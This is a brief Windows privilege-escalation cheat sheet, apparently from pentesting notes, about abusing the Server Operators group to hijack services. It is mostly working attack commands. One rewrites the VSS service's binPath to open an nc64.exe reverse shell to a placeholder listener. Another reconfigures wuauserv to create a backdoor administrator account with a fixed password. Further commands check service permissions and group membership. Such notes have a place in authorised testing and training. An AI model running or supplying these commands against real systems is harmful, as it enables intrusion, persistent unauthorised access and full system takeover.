# Server Operators Service Hijack

The `Server Operators` group can modify, start, and stop services — including changing the `binPath`. Redirect any service to run an arbitrary command as SYSTEM.

```cmd
# Pick any existing service (VSS, Browser, etc.)
sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd <LHOST> <LPORT>"
sc.exe stop VSS
sc.exe start VSS
# Service times out (~30s) but the reverse shell fires first
```

**If sc.exe query is blocked** (SCM access denied), try known writable services directly:
```cmd
sc.exe config wuauserv binpath="cmd /c net user hax P@ss123! /add && net localgroup administrators hax /add"
sc.exe start wuauserv
```

**Check what services Server Operators can control:**
```powershell
# PowerShell - requires elevated or service manager access:
Get-ServiceAcl * | Where-Object { $_.access.IdentityReference -match 'Server Operators' }
```

**Confirm group membership:**
```cmd
whoami /groups | findstr "Server Operators"
net localgroup "Server Operators"
```
